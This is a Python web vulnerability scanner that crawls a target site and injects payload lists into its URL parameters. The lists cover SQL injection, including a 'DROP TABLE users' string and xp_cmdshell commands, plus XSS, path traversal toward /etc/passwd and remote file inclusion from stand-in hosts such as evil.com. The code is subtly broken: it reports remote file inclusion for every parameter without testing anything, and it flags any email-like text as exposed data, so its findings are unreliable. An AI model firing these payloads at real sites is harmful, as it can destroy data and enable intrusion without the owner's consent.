import requests
from bs4 import BeautifulSoup
import urllib.parse
import colorama
import re
from concurrent.futures import ThreadPoolExecutor
import sys
from typing import List, Dict, Set
import datetime

class WebSecurityScanner:
    def __init__(self, target_url: str, max_depth: int = 3):
        print("""
        IMPORTANT DISCLAIMER:
        This scanner is a preliminary automated testing tool and should NOT be 
        considered a replacement for comprehensive manual security testing.
        
        Recommended additional testing:
        - Manual penetration testing
        - Code review
        - Business logic testing
        - Authentication testing
        - Custom workflow testing
        - API security assessment
        """)
        
        
        """
        Initialize the security scanner with a target URL and maximum crawl depth.

        Args:
            target_url: The base URL to scan
            max_depth: Maximum depth for crawling links (default: 3)
        """
        self.target_url = target_url 
        self.max_depth = max_depth
        self.visited_urls: Set[str] = set()
        self.vulnerabilities: List[Dict] = []
        self.session = requests.Session()

        # Initialize colorama for cross-platform colored output
        colorama.init()

        # Add more comprehensive SQL injection payloads
        self.sql_payloads = [
            "'", 
            "1' OR '1'='1", 
            "' OR 1=1--", 
            "' UNION SELECT NULL--",
            "1'; DROP TABLE users--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND 1=CONVERT(int,(SELECT @@version))--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1)) OR SQLi=((1",
            "'; exec master..xp_cmdshell 'ping 10.10.10.10'--",
            "/**/SELECT/**/1",
            ") UNION SELECT %s--" % ("NULL,"*10),
            "'; BEGIN DECLARE @ret int; EXEC @ret = xp_cmdshell 'dir *.exe'; SELECT @ret; END--",
            "' OR '1'='1' INTO OUTFILE 'result.txt'--",
            "' HAVING 1=1--"
        ]

    def normalize_url(self, url: str) -> str:
        """Normalize the URL to prevent duplicate checks"""
        parsed = urllib.parse.urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    def crawl(self, url: str, depth: int = 0) -> None:
        """
        Crawl the website to discover pages and endpoints.

        Args:
            url: Current URL to crawl
            depth: Current depth in the crawl tree
        """
        if depth > self.max_depth or url in self.visited_urls:
            return

        try:
            self.visited_urls.add(url)
            response = self.session.get(url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all links in the page
            links = soup.find_all('a', href=True)
            for link in links:
                next_url = urllib.parse.urljoin(url, link['href'])
                if next_url.startswith(self.target_url):
                    self.crawl(next_url, depth + 1)

        except Exception as e:
            print(f"Error crawling {url}: {str(e)}")
            
            
    def check_sql_injection(self, url: str) -> None:
        """Test for potential SQL injection vulnerabilities"""
        for payload in self.sql_payloads:
            try:
                # Test GET parameters
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)

                for param in params:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                        f"{param}={payload}")
                    response = self.session.get(test_url)

                    # Look for SQL error messages
                    if any(error in response.text.lower() for error in 
                        ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle']):
                        self.report_vulnerability({
                            'type': 'SQL Injection',
                            'url': url,
                            'parameter': param,
                            'payload': payload
                        })

            except Exception as e:
                print(f"Error testing SQL injection on {url}: {str(e)}")
                
    def check_xss(self, url: str) -> None:
            """Test for potential Cross-Site Scripting vulnerabilities"""
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ]

            for payload in xss_payloads:
                try:
                    # Test GET parameters
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query)

                    for param in params:
                        test_url = url.replace(f"{param}={params[param][0]}", 
                                            f"{param}={urllib.parse.quote(payload)}")
                        response = self.session.get(test_url)

                        if payload in response.text:
                            self.report_vulnerability({
                                'type': 'Cross-Site Scripting (XSS)',
                                'url': url,
                                'parameter': param,
                                'payload': payload
                            })

                except Exception as e:
                    print(f"Error testing XSS on {url}: {str(e)}")
                    
    def check_sensitive_info(self, url: str) -> None:
        """Check for exposed sensitive information"""
        sensitive_patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'api_key': r'api[_-]?key[_-]?([\'"|`])([a-zA-Z0-9]{32,45})\1'
        }

        try:
            response = self.session.get(url)

            for info_type, pattern in sensitive_patterns.items():
                matches = re.finditer(pattern, response.text)
                for match in matches:
                    self.report_vulnerability({
                        'type': 'Sensitive Information Exposure',
                        'url': url,
                        'info_type': info_type,
                        'pattern': pattern
                    })

        except Exception as e:
            print(f"Error checking sensitive information on {url}: {str(e)}")
    
    def check_directory_traversal(self, url: str) -> None:
        """Test for directory traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%2f..%2f..%2fetc/passwd"
        ]
        
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for param in params:
                for payload in traversal_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={urllib.parse.quote(payload)}")
                    response = self.session.get(test_url)
                    
                    # Check for common system file contents
                    if any(indicator in response.text for indicator in 
                          ['root:x:', '[boot loader]', 'System32']):
                        self.report_vulnerability({
                            'type': 'Directory Traversal',
                            'url': url,
                            'parameter': param,
                            'payload': payload
                        })
        except Exception as e:
            print(f"Error testing directory traversal on {url}: {str(e)}")

    def check_file_inclusion(self, url: str) -> None:
        """Test for Local/Remote File Inclusion vulnerabilities"""
        lfi_payloads = [
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/shell.php"
        ]
        
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for param in params:
                # Test LFI
                for payload in lfi_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={urllib.parse.quote(payload)}")
                    response = self.session.get(test_url)
                    
                    if any(indicator in response.text for indicator in 
                          ['root:x:', 'PHP Version', '[drivers]']):
                        self.report_vulnerability({
                            'type': 'Local File Inclusion',
                            'url': url,
                            'parameter': param,
                            'payload': payload
                        })
                
                # Test RFI
                for payload in rfi_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={urllib.parse.quote(payload)}")
                    self.report_vulnerability({
                        'type': 'Remote File Inclusion',
                        'url': url,
                        'parameter': param,
                        'payload': payload
                    })
        except Exception as e:
            print(f"Error testing file inclusion on {url}: {str(e)}")

    def check_csrf(self, url: str) -> None:
        """Test for CSRF vulnerabilities"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for forms
            forms = soup.find_all('form')
            for form in forms:
                # Check for CSRF tokens
                csrf_tokens = form.find_all('input', attrs={
                    'type': 'hidden',
                    'name': re.compile(r'csrf|token|nonce', re.I)
                })
                
                if not csrf_tokens:
                    self.report_vulnerability({
                        'type': 'CSRF Vulnerability',
                        'url': url,
                        'evidence': 'Form without CSRF token',
                        'form_action': form.get('action', ''),
                        'form_method': form.get('method', 'GET')
                    })
        except Exception as e:
            print(f"Error testing CSRF on {url}: {str(e)}")

    def check_security_headers(self, url: str) -> None:
        """Check for missing or misconfigured security headers"""
        try:
            response = self.session.get(url)
            headers = response.headers
            
            security_headers = {
                'Strict-Transport-Security': 'Missing HSTS header',
                'X-Frame-Options': 'Missing clickjacking protection',
                'X-Content-Type-Options': 'Missing MIME-type protection',
                'Content-Security-Policy': 'Missing CSP header',
                'X-XSS-Protection': 'Missing XSS protection header',
                'Referrer-Policy': 'Missing referrer policy'
            }
            
            for header, message in security_headers.items():
                if header not in headers:
                    self.report_vulnerability({
                        'type': 'Missing Security Header',
                        'url': url,
                        'header': header,
                        'description': message
                    })
        except Exception as e:
            print(f"Error checking security headers on {url}: {str(e)}")

    def check_ssl_tls(self, url: str) -> None:
        """Check SSL/TLS configuration"""
        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.scheme != 'https':
                self.report_vulnerability({
                    'type': 'Insecure Protocol',
                    'url': url,
                    'description': 'Site not using HTTPS'
                })
                return

            response = self.session.get(url)
            cert = response.raw.connection.sock.getpeercert()
            
            # Check certificate expiration
            not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
            if not_after < datetime.datetime.now():
                self.report_vulnerability({
                    'type': 'SSL/TLS Issue',
                    'url': url,
                    'description': 'Expired SSL certificate'
                })
            
            # Check for weak cipher suites (if possible)
            try:
                cipher = response.raw.connection.sock.cipher()
                weak_ciphers = ['RC4', 'DES', '3DES', 'MD5']
                if any(weak in cipher[0] for weak in weak_ciphers):
                    self.report_vulnerability({
                        'type': 'SSL/TLS Issue',
                        'url': url,
                        'description': f'Weak cipher suite in use: {cipher[0]}'
                    })
            except:
                pass

        except Exception as e:
            print(f"Error checking SSL/TLS on {url}: {str(e)}")

    def scan(self) -> List[Dict]:
        """
        Main scanning method that coordinates the security checks

        Returns:
            List of discovered vulnerabilities
        """
        print(f"\n{colorama.Fore.BLUE}Starting security scan of {self.target_url}{colorama.Style.RESET_ALL}\n")

        # First, crawl the website
        self.crawl(self.target_url)

        # Then run security checks on all discovered URLs
        with ThreadPoolExecutor(max_workers=5) as executor:
            for url in self.visited_urls:
                executor.submit(self.check_sql_injection, url)
                executor.submit(self.check_xss, url)
                executor.submit(self.check_sensitive_info, url)
                executor.submit(self.check_directory_traversal, url)
                executor.submit(self.check_file_inclusion, url)
                executor.submit(self.check_csrf, url)
                executor.submit(self.check_security_headers, url)
                executor.submit(self.check_ssl_tls, url)

        return self.vulnerabilities

    def report_vulnerability(self, vulnerability: Dict) -> None:
        """Record and display found vulnerabilities"""
        self.vulnerabilities.append(vulnerability)
        print(f"{colorama.Fore.RED}[VULNERABILITY FOUND]{colorama.Style.RESET_ALL}")
        for key, value in vulnerability.items():
            print(f"{key}: {value}")
        print()
        
if __name__ == "__main__":
        if len(sys.argv) != 2:
            print("Usage: python scanner.py <target_url>")
            sys.exit(1)

        target_url = sys.argv[1]
        scanner = WebSecurityScanner(target_url)
        vulnerabilities = scanner.scan()

        # Print summary
        print(f"\n{colorama.Fore.GREEN}Scan Complete!{colorama.Style.RESET_ALL}")
        print(f"Total URLs scanned: {len(scanner.visited_urls)}")
        print(f"Vulnerabilities found: {len(vulnerabilities)}")
                    
                            
                    
                                
